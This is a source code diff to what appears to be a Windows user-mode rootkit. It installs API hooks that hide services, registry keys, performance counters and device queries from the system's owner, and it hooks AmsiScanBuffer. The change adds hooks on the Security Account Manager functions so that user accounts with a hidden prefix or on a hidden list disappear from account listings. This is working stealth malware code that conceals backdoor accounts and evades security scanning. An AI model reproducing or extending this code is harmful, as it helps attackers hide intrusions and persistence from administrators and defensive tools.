@@ -24,6 +24,8 @@ static NT_ENUMSERVICESSTATUSEXA OriginalEnumServicesStatusExA;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
 static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
+static NT_SAMENUMERATEUSERSINDOMAIN OriginalSamEnumerateUsersInDomain;
+static NT_SAMQUERYDISPLAYINFORMATION OriginalSamQueryDisplayInformation;
 static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
@@ -56,6 +58,8 @@ VOID InitializeHooks()
 	InstallHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
+	InstallHook("samlib.dll", "SamEnumerateUsersInDomain", (LPVOID*)&OriginalSamEnumerateUsersInDomain, HookedSamEnumerateUsersInDomain);
+	InstallHook("samlib.dll", "SamQueryDisplayInformation", (LPVOID*)&OriginalSamQueryDisplayInformation, HookedSamQueryDisplayInformation);
 	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	InstallHook("amsi.dll", "AmsiScanBuffer", (LPVOID*)&OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
@@ -63,8 +67,10 @@ VOID InitializeHooks()
 
 	// Usually, ntdll.dll should be the only DLL to hook.
 	// Unfortunately, the actual enumeration of services happens in services.exe - a protected process that cannot be injected.
-	// Tje EnumService* methods from advapi32.dll access services.exe through RPC.
+	// The EnumService* methods from advapi32.dll access services.exe through RPC.
 	// There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
+
+	// The same applies to a select few other functions as well. HOWEVER: Any function that is exposed in ntdll WILL be hooked there, not in higher level DLLs.
 
 	TlsNtEnumerateKeyCacheKey = TlsAlloc();
 	TlsNtEnumerateKeyCacheIndex = TlsAlloc();
@@ -94,6 +100,8 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
+	UninstallHook(OriginalSamEnumerateUsersInDomain, HookedSamEnumerateUsersInDomain);
+	UninstallHook(OriginalSamQueryDisplayInformation, HookedSamQueryDisplayInformation);
 	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
@@ -472,8 +480,10 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 		correctedIndex = cacheCorrectedIndex + 1;
 	}
 
-	BYTE buffer[1024];
 	WCHAR keyPath[1000];
+	if (!GetRegistryKeyName(key, keyPath, 1000)) keyPath[0] = L'\0';
+
+	BYTE buffer[1024];
 	WCHAR fullPath[1000];
 	PNT_KEY_BASIC_INFORMATION basicInformation = (PNT_KEY_BASIC_INFORMATION)buffer;
 
@@ -492,7 +502,7 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 		{
 			hidden = TRUE;
 		}
-		else if (GetRegistryKeyName(key, keyPath, 1000))
+		else if (lstrlenW(keyPath) > 0)
 		{
 			StrCpyW(fullPath, keyPath);
 			StrCatW(fullPath, L"\\");
@@ -555,8 +565,10 @@ static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_
 		correctedIndex = cacheCorrectedIndex + 1;
 	}
 
-	BYTE buffer[1024];
 	WCHAR keyPath[1000];
+	if (!GetRegistryKeyName(key, keyPath, 1000)) keyPath[0] = L'\0';
+
+	BYTE buffer[1024];
 	WCHAR fullPath[1000];
 	PNT_KEY_VALUE_BASIC_INFORMATION basicInformation = (PNT_KEY_VALUE_BASIC_INFORMATION)buffer;
 
@@ -575,7 +587,7 @@ static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_
 		{
 			hidden = TRUE;
 		}
-		else if (GetRegistryKeyName(key, keyPath, 1000))
+		else if (lstrlenW(keyPath) > 0)
 		{
 			StrCpyW(fullPath, keyPath);
 			StrCatW(fullPath, L"\\");
@@ -775,6 +787,50 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 						}
 					}
 				}
+			}
+		}
+	}
+
+	return status;
+}
+static NTSTATUS NTAPI HookedSamEnumerateUsersInDomain(HANDLE domainHandle, PULONG enumerationContext, ULONG userAccountControl, LPVOID *buffer, ULONG preferedMaximumLength, PULONG countReturned)
+{
+	NTSTATUS status = OriginalSamEnumerateUsersInDomain(domainHandle, enumerationContext, userAccountControl, buffer, preferedMaximumLength, countReturned);
+
+	if (NT_SUCCESS(status) && buffer && *buffer && countReturned)
+	{
+		PNT_SAM_RID_ENUMERATION rids = (PNT_SAM_RID_ENUMERATION)*buffer;
+		for (ULONG i = 0; i < *countReturned; i++)
+		{
+			rids[i].Name.Buffer[rids[i].Name.Length / sizeof(WCHAR)] = L'\0';
+
+			if (HasPrefix(rids[i].Name.Buffer) || IsUserNameHidden(rids[i].Name.Buffer))
+			{
+				memmove(&rids[i], &rids[i + 1], (*countReturned - i - 1) * sizeof(NT_SAM_RID_ENUMERATION));
+				(*countReturned)--;
+				i--;
+			}
+		}
+	}
+
+	return status;
+}
+static NTSTATUS NTAPI HookedSamQueryDisplayInformation(HANDLE domainHandle, NT_DOMAIN_DISPLAY_INFORMATION displayInformation, ULONG index, ULONG entryCount, ULONG preferredMaximumLength, PULONG totalAvailable, PULONG totalReturned, PULONG returnedEntryCount, LPVOID *sortedBuffer)
+{
+	NTSTATUS status = OriginalSamQueryDisplayInformation(domainHandle, displayInformation, index, entryCount, preferredMaximumLength, totalAvailable, totalReturned, returnedEntryCount, sortedBuffer);
+
+	if (NT_SUCCESS(status) && sortedBuffer && *sortedBuffer && returnedEntryCount && displayInformation == DomainDisplayUser)
+	{
+		PNT_SAMPR_DISPLAY_USER users = (PNT_SAMPR_DISPLAY_USER)*sortedBuffer;
+		for (ULONG i = 0; i < *returnedEntryCount; i++)
+		{
+			users[i].AccountName.Buffer[users[i].AccountName.Length / sizeof(WCHAR)] = L'\0';
+
+			if (HasPrefix(users[i].AccountName.Buffer) || IsUserNameHidden(users[i].AccountName.Buffer))
+			{
+				memmove(&users[i], &users[i + 1], (*returnedEntryCount - i - 1) * sizeof(NT_SAMPR_DISPLAY_USER));
+				(*returnedEntryCount)--;
+				i--;
 			}
 		}
 	}
